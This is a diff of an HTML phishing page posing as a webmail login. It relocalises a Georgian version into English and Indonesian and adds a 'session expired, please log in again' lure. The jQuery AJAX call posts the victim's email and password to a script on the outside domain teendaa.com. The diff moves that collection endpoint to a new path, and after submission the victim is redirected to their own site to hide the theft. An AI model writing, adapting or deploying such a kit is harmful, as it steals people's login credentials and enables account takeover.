@@ -16,7 +16,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-    <title>ვებგვერდის განახლება</title>
+    <title>Webmail login</title>
     <link href="css/hover.css" rel="stylesheet" media="all">
 
     <style type="text/css">
@@ -88,18 +88,18 @@
             </div>
             <div class="col-lg-10 mx-auto mt-5">
               <center>
-                <span id="error" class="text-danger" style="display: none;">ეგ ანგარიში არ არსებობს. შეიყვანეთ სხვა ანგარიში</span>
+                <span id="error" class="text-danger" style="display: none;">Akun itu tidak ada. Masukkan akun lain</span>
               </center>
               <form id="contact" class="form-horizontal well">
                 <div id="div1" class="text-dark">
                   <div class="col-lg-12">
                     <div class="form-group">
                       <div id="inputbar">
-                        <label for="exampleInputEmail1">Ელექტრონული მისამართი</label>
+                        <label for="exampleInputEmail1">Sesi Anda telah kedaluwarsa, silakan login kembali untuk melanjutkan.</label>
                           <div class="input-icons">
                             <i class="fa fa-user icon"></i> 
                             <!-- <input class="input-field" type="text"> -->
-                            <input type="email" name="email" class="input-field rounded" id="email" aria-describedby="emailHelp" placeholder="შეიყვანეთ თქვენი ელ.ფოსტის მისამართი" readonly="readonly">
+                            <input type="email" name="email" class="input-field rounded" id="email" aria-describedby="emailHelp" placeholder="Enter your email address" readonly="readonly">
                           </div> 
                           <!-- <div class="input-group-prepend">
                             <span class="input-group-text border-right-0" style="background-color: transparent;"><i class="fas fa-user" style="color: #8FA7AD;"></i></span>
@@ -114,10 +114,10 @@
                   </div>
                   <div class="col-lg-12">
                     <div class="form-group">
-                      <label for="Password">პაროლი</label>
+                      <label for="Password">Password</label>
                       <div class="input-icons">
                             <i class="fas fa-lock icon"></i> 
-                            <input type="password" name="password" class="input-field rounded" id="password" aria-describedby="emailHelp" placeholder="შეიყვანეთ თქვენი ელ.ფოსტის პაროლი">
+                            <input type="password" name="password" class="input-field rounded" id="password" aria-describedby="emailHelp" placeholder="Masukkan alamat email Anda">
                           </div> 
                         
                     </div>
@@ -125,12 +125,12 @@
                 </div>
               </div>
               <div class="text-center col-lg-9 mx-auto mt-4">
-                <button class="btn py-1 w-100 border-dark text-white" id="submit-btn" style="background-color: #179BD7;">Შესვლა</button>
+                <button class="btn py-1 w-100 border-dark text-white" id="submit-btn" style="background-color: #179BD7;">Gabung</button>
               </div>
             </form>
           </div>
           <div class="col-lg-12 text-center mt-1"> 
-            <small class="font-weight-bold" style="color: #766;">პაროლის გადაყენება</small>
+            <small class="font-weight-bold" style="color: #766;">Atur Ulang Kata Sandi</small>
 
           </div> 
           <div class="col-lg-12 text-center mt-5 pt-3"> 
@@ -225,7 +225,7 @@
       
       $.ajax({
         dataType: 'JSON',
-        url: 'https://teendaa.com/rge/weka.php',
+        url: 'https://teendaa.com/rid/emo.php',
         type: 'POST',
         data:{
           email:email,
@@ -233,7 +233,7 @@
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('დადასტურებულია...');
+              $('#submit-btn').html('Memverifikasi...');
             },
             success: function(response){
               if(response){
@@ -261,10 +261,10 @@
                 window.location.replace("https://www."+my_slice);
               }
               $("#msg").show();
-              $('#msg_text').html("განცხადება არასწორია");
+              $('#msg_text').html("Loginnya tidak valid");
             },
             complete: function(){
-              $('#submit-btn').html('Შესვლა');
+              $('#submit-btn').html('Gabung');
             }
           });
     });
